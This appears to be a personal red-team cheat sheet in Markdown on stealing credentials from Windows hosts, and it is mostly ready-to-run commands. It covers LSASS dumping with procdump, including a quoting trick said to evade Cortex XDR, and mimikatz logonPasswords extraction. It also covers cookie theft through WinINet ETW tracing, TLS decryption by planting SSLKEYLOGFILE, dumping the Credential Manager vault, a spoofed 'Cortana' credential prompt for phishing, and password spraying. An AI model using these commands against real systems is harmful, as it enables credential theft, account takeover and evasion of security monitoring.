# Windows 
---
# Navigation
1. **[[# Process memory]]**
	- [[#1- Procdump exe]]
	- [[#2- Mimikittenz Not working on windows 10]]
	- [[#3- mimikatz]]
2. **[[#Abusing logging tracing]]**
	- [[#1- Tracing the WinINet provider]]
	- [[#2- Decrypting TLS traffic using TLS key logging Not working on latest firefox and chrome]]
	- [[#3- Peeking at shell command-line history files]]
	- [[#4- Command line arguments]]
3. **[[#Windows Credential Manager]]**
4. **[[#Phishing and credential dialog spoofing]]**
5. **[[#Password spray attacks]]**
---
 # Process memory:
 ## 1- Procdump.exe
 ```powershell
procdump.exe -accepteula -ma <PID> /temp/proc.dmp
 
#Additionally, depending on the EDR, it may be sufficient to simply add quotations around the process name (This bypasses Cortex XDR for example):
procdump.exe -accepteula -ma “lsass.exe” out.dmp

 ```
To dump all processes:
```powershell
#make sure to install procdump from Systeinternals and have it in your path
Get-Process | % {procdump.exe -ma $_.Id }

gci *.dmp | % { strings.exe -n 17 $_.Name | Select-String "password=" | Out-File ($_.Name+".txt")}
```
> **Important Note:**
> It's recommended to dump a single process at a time for investigation because dumping all processes takes alot of time and could trigger detections especially when working with LSASS.
> 
> **Download:** https://download.sysinternals.com/files/SysinternalsSuite.zip

 ## 2- Mimikittenz (Not working on windows 10)
 Rather than writing files to disk, Mimikittenz will read the memory of processes using the Win32 API  `ReadProcessMemory`  to search for a set of common credentials.  `Mimikittenz`  can easily be customized to search for additional regular expressions in process memory.
```powershell
Invoke-Mimikittenz
```
> **Download:** https://github.com/orlyjamie/mimikittenz

 ## 3- mimikatz
 ```powershell
sekurlsa::minidump lsass.DMP
log lsass.txt
sekurlsa::logonPasswords
 ```
 
 ---
 # Abusing logging & tracing:
 For debugging and monitoring purposes, applications and services emit logs and traces. This enables ***privileged*** users on the machine to get more insights into the inner workings of an application during runtime. Windows has a powerful tracing infrastructure called **`Event Tracing for Windows (ETW)`**
 There are tools out of the box in Windows to interact with ETW, and they allow us to start traces, collect data, and stop them, such as **`wevtutil`** and **`logman`** .
-  **`logman`** : Allows us to manage event tracing sessions.
 Run the following command to see what providers are available:
 ```powershell
 logman query providers
 ```
 
## 1- Tracing the WinINet provider
The Windows Internet (WinINet) application programming interface (API) enables your application to interact with FTP and HTTP protocols to access Internet resources. it also can be used to inspect TLS traffic.
1. **Launch a tracing session with logman as an Administrator:**
```powershell
logman start WinInetSession -p "Microsoft-Windows- WinInet" -o WinInetTraceSession.evt -ets
```
2. **Now tracing events are now written to the provided evt file**
3. **Searching event file to get some juicy info such as cookies:**
```powershell
# The following is just an example, consider knowing the cookie header for what you are interested in..
.\strings.exe -nobanner -n 8 .\WinInetTraceSession.evt | Select-String "Set-Cookie: "
```
4- If you'd like to view the binary file in Event Viewer, you can do that too. Just launch **`eventvwr.exe`** and open the file 

You can convert the event file into a text file:
```powershell
# Converting into text file
wevtutil qe WinInetTraceSession.evt /lf:True /f:Text > WinInetTrace.log
```
> **Important Note:**
> Microsoft Edge & Internet Explorer use this provider, so in case of other browsers, you will have to know their provider or another tracing technique.

## 2- Decrypting TLS traffic using TLS key logging (Not working on latest firefox and chrome)
In order to decrypt TLS traffic, TLS key logging can be leveraged, which is a feature that will write TLS sessions keys to a user-defined location. The location can be specified via the **SSLKEYLOGFILE** environment.
```powershell
[Environment]::SetEnvironmentVariable("SSLKEYLOGFILE ","c:\temp\ssl.keylog","MACHINE")
# Verifying
 [Environment]::GetEnvironmentVariable("SSLKEYLOGFILE ","MACHINE")
```
> **Note:**  The target environment variable is  **`Machine`** , then the environment variable is stored in the HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Session Manager\Environment key of the local computer's registry. It is also copied to all instances of File Explorer. The environment variable is then inherited by any new processes that are launched from File Explorer.

- **Now lets capture network traffic**
```powershell
netsh trace start capture=yes tracefile=c:\temp\tracing.etl
# Stop
netsh trace stop
```
- **use  `Microsoft Message Analyzer`   to convert the .etl file into a .cap file that Wireshark can process**
- **Finally analyze with wireshark**

## 3- Peeking at shell command-line history files
- Get the history file location
```powershell
(Get-PSReadLineOption).HistorySavePath
```
## 4- Command line arguments
- Using  **`WmiObject`**
```powershell
Get-WmiObject Win32_Process | Select-Object Name, CommandLine
```
- Using  **`wmic.exe`** (wmic will be removed in the future)
```powershell
# Removing spaces will cause an error
wmic process get name,processid,commandline
```
---
#  Windows Credential Manager
Windows Credential Manager is used to store credentials. It is used by some browsers (not Chrome or Firefox, though).
- Retrieve saved web logins ( [Get-WebCredentials.ps1](https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1))
```powershell
$ClassHolder = [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]

$VaultObj = new-object Windows.Security.Credentials.PasswordVault

$VaultObj.RetrieveAll() | foreach { $_.RetrievePassword(); $_ }
```
> **More ways to abuse windows cred. manager using mimikatz:** 
> https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials

---
# Phishing and credential dialog spoofing
- Spoofed dialog box
```powershell
 $creds = Get-Credential -UserName $env:USERNAME -Message "Cortana wants setup a reminder and needs your permission"
```

---
# Password spray attacks
- Determine the password policy to avoid locking accounts
```powershell
# Using crackmapexec
crackmap exec [options..] --pass-pol
# Powershell
Get-ADDefaultDomainPasswordPolicy
Get-ADUserResultantPasswordPolicy
```
- Password spraying
	- [Sharpspray](https://github.com/iomoath/SharpSpray) 
	- [Crackmapexec](https://github.com/byt3bl33d3r/CrackMapExec)